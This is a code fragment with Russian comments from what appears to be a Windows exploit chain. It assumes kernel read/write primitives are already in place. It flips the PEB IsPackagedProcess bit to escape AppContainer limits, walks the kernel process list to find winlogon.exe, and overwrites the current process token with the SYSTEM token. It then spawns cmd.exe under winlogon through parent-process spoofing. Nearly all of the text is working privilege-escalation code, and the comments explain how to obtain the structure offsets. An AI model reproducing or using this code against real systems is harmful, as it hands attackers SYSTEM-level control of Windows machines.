// Получение PEB текущего процесса
var pinfo = _PROCESS_BASIC_INFORMATION.Ptr.cast(malloc(_PROCESS_BASIC_INFORMATION.size));
var pinfo_sz = Uint64.Ptr.cast(malloc(8));
NtQueryInformationProcess(GetCurrentProcess(), 0, pinfo, _PROCESS_BASIC_INFORMATION.size, pinfo_sz);
var peb = pinfo.PebBaseAddress;
/* Переключаем значение бита IsPackagedProcess для обхода ограничений
В данном случае peb имеет тип char * */
var bit_field = peb[3];
bit_field = bit_field.xor(1 << 4);
peb[3] = bit_field;

/* Смещения полей структур в текущей версии ядра также можно получить
с помощью WinDbg в режиме отладки ядра. Для этого необходимо выполнить следующее:
dt ntdll!_EPROCESS uniqueprocessid token activeprocesslinks
В результате будут перечислены смещения всех перечисленных в аргументе полей */
var ActiveProcessLinks = system_eprocess.add(
        g_config.ActiveProcessLinksOffset);
var current_pid = GetCurrentProcessId();
var current_eprocess = null;
var winlogon_pid = null;
// winlogon.exe - название процесса, который будет родительским для cmd.exe
var winlogon = new CString("winlogon.exe");
var image_name = malloc(16);
var system_pid = kernel_read_64(system_eprocess.add(
            g_config.UniqueProcessIdOffset));
while(!current_eprocess || !winlogon_pid)
{
    var eprocess = kernel_read_64(ActiveProcessLinks).sub(
            g_config.ActiveProcessLinksOffset);
    var pid = kernel_read_64(eprocess.add(
                g_config.UniqueProcessIdOffset));

    // Копируем название просматриваемого процесса из пространства ядра
    // пользовательское пространство
    Uint64.store(
        image_name.address,
        kernel_read_64(eprocess.add(g_config.ImageNameOffset))
    );
    Uint64.store(
        image_name.address.add(8),
        kernel_read_64(eprocess.add(g_config.ImageNameOffset + 8))
    );

    // Ищем процесс winlogon.exe и текущий процесс
    if(_stricmp(winlogon, image_name).eq(0))
    {
        winlogon_pid = pid;
    }
    if (current_pid.eq(pid))
    {
        current_eprocess = eprocess;
    }

    // Перемещаемся к следующему процессу в двусвязном списке
    ActiveProcessLinks = eprocess.add(
            g_config.ActiveProcessLinksOffset);
}

// Получение токена системного процесса
var sys_token = kernel_read_64(system_eprocess.add(g_config.TokenOffset));

// Подготовка структур данных для запуска нового процесса в качестве
// дочернего процесса winlogon.exe
var pi = malloc(24);
memset(pi, 0, 24);
var si = malloc(104 + 8);
memset(si, 0, 104 + 8);
Uint32.store(si.address, new Integer(104 + 8));
var args = WString("cmd.exe");

var AttributeListSize = Uint64.Ptr.cast(malloc(8));
InitializeProcThreadAttributeList(0, 1, 0, AttributeListSize);
var lpAttributeList = malloc(AttributeListSize[0]);
Uint64.store(
    si.address.add(104),
    lpAttributeList
);
InitializeProcThreadAttributeList(lpAttributeList, 1, 0, AttributeListSize)
var winlogon_handle = Uint64.Ptr.cast(malloc(8));

// Запись системного токена в текущий процесс
kernel_write_64(current_eprocess.add(g_config.TokenOffset), sys_token);

/* Обладая правами системного процесса и отключив ограничения AppContainer,
мы можем получить дескриптор запущенного процесса winlogon.exe и запустить
новый процесс в качестве дочернего процесса winlogon.exe */
winlogon_handle[0] = OpenProcess(PROCESS_ALL_ACCESS, 0, winlogon_pid);
UpdateProcThreadAttribute(lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        winlogon_handle, 8, 0, 0);
CreateProcess(0, args, 0, 0, 0, EXTENDED_STARTUPINFO_PRESENT, 0, 0, si, pi);
